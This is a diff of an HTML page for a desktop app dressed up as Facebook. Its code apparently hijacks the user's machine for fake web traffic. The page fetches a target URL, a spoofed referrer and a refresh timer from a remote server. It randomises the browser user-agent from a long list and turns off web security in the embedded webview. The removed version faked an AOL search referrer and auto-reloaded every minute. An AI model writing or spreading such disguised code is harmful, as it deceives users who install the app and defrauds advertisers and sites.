@@ -1,20 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-
-  <head>
+<head>
     <title id="window-title">Facebook</title>
     <link rel="stylesheet" href="./style.css" />
-	<meta http-equiv="cache-control" content="max-age=0" />
-    <meta http-equiv="cache-control" content="no-cache" />
-    <meta http-equiv="expires" content="0" />
-    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
-    <meta http-equiv="pragma" content="no-cache" />
-  </head>
+	<meta id="timex" http-equiv="refresh" content="#">
+ </head>
 
   <body>
     <div id='wrapper'>
       <div id="load">
-        <img id="logo" src="./img/fb.png" alt="facebook logo">
+        <img id="logo" src="./fb.png" alt="facebook logo">
         <div class="loading-dots">
           <div class="loading-dots--dot"></div>
           <div class="loading-dots--dot"></div>
@@ -33,35 +28,101 @@
           <span id="title">Facebook</span>
         </div>
       </div>
-	   <webview
-		          id="webview"
-                  autosize
-                  src="http://tr.neox.in/fb/index.html"
-                  httpreferrer="http://search.aol.com/aol/search?q=kids-car-puzzle-html5game"
-                  webpreferences="allowRunningInsecureContent"
-		  useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"  
-                  disablewebsecurity="on"
-                  preload="./preload.js"
-				  style="width:100%;height: 95%;"
-				  
-        ></webview>
-	  
-    </div>
+<webview partition="SoftGame1" id="webview" autosize src="" httpreferrer="" useragent="" webpreferences="allowRunningInsecureContent" disablewebsecurity="on"></webview>
+  </div>
 <script>
-            onload = () => {
-              const webview = document.querySelector('webview')
-      
-              webview.addEventListener('dom-ready', () => {
-                //webview.openDevTools()
-	setInterval(() => {
-  document.getElementById("reload").click();
-}, 60000)	
-			  
-			  })
-            }
-				
-			
-          </script>
+const webview = document.querySelector('#webview')
+window.onload = function() { let file = "https://tr.neox.in/softgame/rest-api.php?json=softgamellc" 
+fetch (file) .then(res => res.json()) .then(data => {
+document.querySelector('#webview').src = data[0].url; 
+document.querySelector('#webview').httpreferrer = data[0].httpreferrer;
+document.querySelector('#timex').content = data[0].time;
+//document.querySelector('#webview').useragent = data[0].useragent; 
+var UserAgent = [ 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0 (Edition std-1)',
+'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41',
+'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2; rv:109.0) Gecko/20100101 Firefox/109.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
+'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36',
+'Mozilla\/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; WOW64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko\/20100101 Firefox\/92.0',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36 Edg\/93.0.961.38',
+'Mozilla\/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/64.0.3282.119 Safari\/537.36',
+'iTunes\/4.7.1 (Windows; N; Windows 10; 8664; DA; cp1252) SqueezeCenter, Squeezebox Server, Logitech Media Server\/8.1.0\/1608700893',
+'iTunes\/12.10.9 (Windows; Microsoft Windows 7 Service Pack 1 x64 Home Premium Edition (Build 7601); x64) AppleWebKit\/7609.3005.1003.3',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko\/20100101 Firefox\/92.0\/YHp47lys-47',
+'iTunes\/12.12 (Windows; Microsoft Windows 10 x64 Enterprise Edition (Build 18363); x64) AppleWebKit\/7612.1029.14005.5',
+'Mozilla\/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36 OPR\/79.0.4143.66 (Edition Campaign 70)',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/91.0.4472.48 CitizenFX\/1.0.0.4673 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/vBO4qGbY-29',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/94.0.4606.61 Safari\/537.36 Edg\/94.0.992.31\/PmaOHqHf-37',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/LyvFBbqy-01',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/nKCykuc7-59',
+'Mozilla\/5.0 (Windows NT 6.1; WOW64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36 OPR\/79.0.4143.61',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.63 Safari\/537.36 OPR\/79.0.4143.61',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/tsiTYauL-03',
+'iTunes\/12.12 (Windows; Microsoft Windows 10 x64 Home Premium Edition (Build 19042); x64) AppleWebKit\/7612.1029.14005.5',
+'Mozilla\/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) HeadlessChrome\/93.0.4577.82 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko\/20100101 Firefox\/92.0\/lPlo1GNo-03',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/MsrGcw1M-27',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/D5zeD5n9-26',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/94.0.4606.61 Safari\/537.36 Edg\/94.0.992.31\/bRqhKxm3-28',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/seJwT3Vw-53',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36 Edg\/93.0.961.52\/Q2uVjzOk-38',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36\/fFcvIMQM-43',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36 Edg\/93.0.961.52\/CaQB5kdf-36',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko\/20100101 Firefox\/92.0\/bDRAEQNB-18',
+'iTunes\/12.12 (Windows; Microsoft Windows 10 x64 Professional Edition (Build 19042); x64) AppleWebKit\/7612.1029.14005.5',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/93.0.4577.82 Safari\/537.36 Edg\/93.0.961.52\/hhp88hBP-52',
+'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) simpleiptvplayer\/3.0.2 Chrome\/91.0.4472.164 Electron\/13.1.8 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/91.0.4472.48 CitizenFX\/1.0.0.4590 Safari\/537.36',
+'Mozilla\/5.0 (Windows NT 10.0; Trident\/7.0; rv:11.0) like Gecko',
+'Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko',
+'Mozilla\/5.0 (Windows NT 6.2; Trident\/7.0; rv:11.0) like Gecko',
+'AppleCoreMedia\/1.0.0.12B466 (Apple TV; U; CPU OS 8_1_3 like Mac OS X; en_us)',
+'Mozilla\/5.0 (CrKey armv7l 1.5.16041) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/31.0.1650.0 Safari\/537.36',
+'Mozilla\/5.0 (Linux; BRAVIA 4K 2015 Build\/LMY48E.S265) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/41.0.2272.101 Safari\/537.36 OPR\/8.0.1754.0',
+'Opera\/9.80 (Linux armv7l; HbbTV\/1.2.1 (; Philips; 40HFL5010T12; ; PHILIPSTV; CE-HTML\/1.0 NETTV/4.4.1 SmartTvA\/3.0.0 Firmware\/004.002.036.135 (PhilipsTV, 3.1.1,)en) ) Presto\/2.12.407 Version\/12.50',
+'Mozilla\/5.0 (Linux; Android 5.1.1; AFTT Build\/LVY48F; wv) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/49.0.2623.10',
+'Mozilla\/5.0 (X11; Linux armv7l) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/43.0.2357.90 Safari\/537.36 CrKey\/1.17.46278',
+'Mozilla\/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit\/538.1+ (KHTML, like Gecko) TV Safari\/538.1+',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 6.5) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/5.0 Chrome\/85.0.4183.93 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/937.36 (KHTML, like Gecko) Gecko\/20100101 Firefox\/92.0 TV safari\/937.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/937.36 (KHTML, like Gecko) SamsungBrowser\/2.0 TV safari\/937.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.0 Chrome\/47.0.2526.69 TV safari\/537.36on',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.0 Chrome\/47.0.2526.69 TV safari\/537.36d?',
+'Mozilla\/5.0 (SMART-TV; LINUX; Tizen 6.0) AppleWebKit\/537.36 (KHTML, like Gecko) 76.0.3809.146\/6.0 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/937.36 (KHTML, like Gecko) SamsungBrowser\/2.0 Chrome\/97.0.2526.69 TV safari\/937.36',
+'Mozilla\/5.0 (SMART-TV; LINUX; Tizen 6.0) AppleWebKit\/537.36 (KHTML, like Gecko) 85.0.4183.93\/6.0 TV Safari\/537.36, SamsungTV=High',
+'Mozilla\/5.0 (SMART-TV; LINUX; Tizen 5.0) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/5.0 TV Safari\/537.36 ',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 4.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.1 Chrome\/56.0.2924.0 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/3.0 Chrome\/69.0.3497.106 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 4.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.1 Chrome\/56.0.2924.0 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.2 Chrome\/63.0.3239.84 TV Safari\/537.36',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit\/538.1 (KHTML, like Gecko) SamsungBrowser\/1.0 TV Safari\/538.1',
+'Mozilla\/5.0 (SMART-TV; LINUX; Tizen 3.0) AppleWebKit\/538.1 (KHTML, like Gecko) Version\/3.0 TV Safari\/538.1',
+'Mozilla\/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit\/537.36 (KHTML, like Gecko) SamsungBrowser\/2.0 Chrome\/47.0.2526.69 TV safari\/537.36',
+  ]; document.querySelector('#webview').useragent = (UserAgent[Math.floor(Math.random()*UserAgent.length)]);
+}); } </script>
+<script> webview.addEventListener('dom-ready', () => {
+webview.addEventListener('did-finish-load', () => document.title = webview.getTitle());
+   // webview.openDevTools() 
+ }) </script>
+
+
   </body>
   <script src="./script.js"></script>
 
